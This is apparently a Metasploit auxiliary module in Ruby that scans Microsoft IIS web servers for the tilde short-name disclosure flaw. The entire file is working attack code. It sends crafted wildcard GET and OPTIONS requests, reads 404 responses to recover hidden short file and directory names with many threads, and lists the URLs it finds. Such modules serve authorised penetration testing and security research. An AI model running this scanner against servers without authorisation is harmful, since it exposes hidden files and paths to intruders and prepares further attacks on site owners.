##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Rex::Proto::Http

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Microsoft IIS shortname vulnerability scanner',
        'Description' => %q{
        'The vulnerability is caused by a tilde character "~" in a Get request, which could
         allow remote attackers to diclose File and Folder names. This is a new technique for
         an existing bug (CVE-2009-4444), which relied on the use of the ;(semicolon) character.
         Soroush Dalili discovered the original bug and the new ~ technique.'
        },
        'Author'         =>
          [
          'MinatoTW <shaks19jais[at]gmail.com>',
          'egre55 <ianaustin[at]protonmail.com>'
          ],
        'License'     => MSF_LICENSE,
        'References'     =>
          [
            [ 'CVE', '2009-4444' ],
            [ 'URL', 'https://soroush.secproject.com/blog/tag/iis-tilde-vulnerability/' ]
          ],
        'Targets' => [[ 'Automatic', {} ]]
      )
    )

  register_options([
          Opt::RPORT(80),
          OptString.new('PATH', [ true, "The base path to start scanning from", "/" ])

  ])
  @dirs = []
  @files = []
  @threads = []
  @queue = Queue.new
  @queue_ext = Queue.new
  @alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&\'()-@^_`{}'
  @found = Array.new
  @found2 = Array.new
  @found3 = Array.new
  end

  def check
    begin
      for method in ['GET', 'OPTIONS']
        res1 = send_request_cgi({
          'uri' => normalize_uri(datastore['PATH'], '*~1*','x.aspx'),
          'method' => method
        })
        # An existing file

        res2 = send_request_cgi({
          'uri' => normalize_uri(datastore['PATH'],'exist*~1*','x.aspx'),
          'method' => method
        })
        # A non-existing file

        if res1.code == 404 && res2.code != 404
          vuln = 1
          break
        end
      end
      if vuln == 1
        vprint_good("Target is vulnerable")
        return Exploit::CheckCode::Detected
      else
        vprint_bad("Target is not vulnerable")
        return Exploit::CheckCode::Safe
      end

      rescue Rex::ConnectionError
        return Exploit::CheckCode::Unknown

    end
  end

  def get_status(f , digit , match)
    res2 = send_request_cgi({
           'uri' => normalize_uri(datastore['PATH'],"#{f}#{match}~#{digit}#{match}"),
           'method' => 'OPTIONS'
            })
    return res2.code
  end

  def get_incomplete_status(url, match, digit , ext)
    res2 = send_request_cgi({
      'uri' => normalize_uri(datastore['PATH'],"#{url}#{match}~#{digit}.#{ext}*"),
           'method' => 'OPTIONS'
            })
    return res2.code
  end

  def get_complete_status(url, digit , ext)
    res2 = send_request_cgi({
      'uri' => normalize_uri(datastore['PATH'],"#{url}*~#{digit}.#{ext}"),
           'method' => 'OPTIONS'
            })
    return res2.code
  end

  def scanner
    while !@queue_ext.empty?
      f = @queue_ext.pop
      url = f.split(':')[0]
      ext = f.split(':')[1]
      status = get_incomplete_status(url, "*" , "1" , ext)
      if status == 404 && ext.size == 3
        @found3.each do |x|
          if get_complete_status(url, x , ext) == 404
            @files << "#{url}~#{x}.#{ext}"
          end
        end
      elsif status == 404 and ext.size < 4
        @found3.each do |x|
          if get_complete_status(url, x , ext) == 404
            @files << "#{url}~#{x}.#{ext}"
          end
        end
        for c in @found2
          @queue_ext << (f + c )
        end
      else
      end
    end
  end

  def scan
    while !@queue.empty?
      url = @queue.pop
      status = get_status(url , "1" , "*")
      if url.size == 6 && status == 404
        @found3.each do |x|
          if get_status(url , x , "") == 404
            @dirs << "#{url}~#{x}"
          end
        end
        for ext in @found2
          @queue_ext << ( url + ':' + ext )
          @threads << Thread.new { scanner }
        end
      elsif status == 404
        @found3.each do |x|
          if get_complete_status(url, x , "") == 404
            @dirs << "#{url}~#{x}"
            break
          end
        end
        if get_incomplete_status(url, "" , "1" , "") == 404
          for ext in @found2
            @queue_ext << ( url + ':' + ext )
            @threads << Thread.new { scanner }
          end
        elsif url.size   < 6
          for c in @found
            @queue  <<(url +c)
          end
        end
      end
    end
  end

  def reduce
    for c in @alpha.chars
      res = send_request_cgi({
             'uri' => normalize_uri(datastore['PATH'],"*#{c}*~1*"),
             'method' => 'OPTIONS'
              })
      if res.code == 404
        @found << c
      end
    end
  end

  def ext
    for c in @alpha.chars
      res = send_request_cgi({
             'uri' => normalize_uri(datastore['PATH'],"*~1.*#{c}*"),
             'method' => 'OPTIONS'
              })
      if res.code == 404
        @found2 << c
      end
    end
  end

  def dup
    array = [*('1'..'9')]
    array.each do |c|
      res = send_request_cgi({
             'uri' => normalize_uri(datastore['PATH'],"*~#{c}.*"),
             'method' => 'OPTIONS'
              })
      if res.code == 404
        @found3 << c
      end
    end
  end

  def run
    print_status("Scanning in progress...")
    @threads << Thread.new { reduce }
    @threads << Thread.new { dup }
    @threads << Thread.new { ext }
    @threads.each(&:join)

    for c in @found
      @queue << c
    end

    20.times {
      @threads << Thread.new { scan }
    }

    sleep(1) until @queue_ext.empty?

    @threads.each(&:join)
    if @dirs.empty?
    else
      print_status("Directories found")
      @dirs.each do |x|
        print_line("http://#{datastore['RHOST']}#{datastore['PATH']}#{x}")
      end
    end
    if @files.empty?
    else
      print_status("Files found")
      @files.each do |x|
        print_line("http://#{datastore['RHOST']}#{datastore['PATH']}#{x}")
      end
    end
  end
end





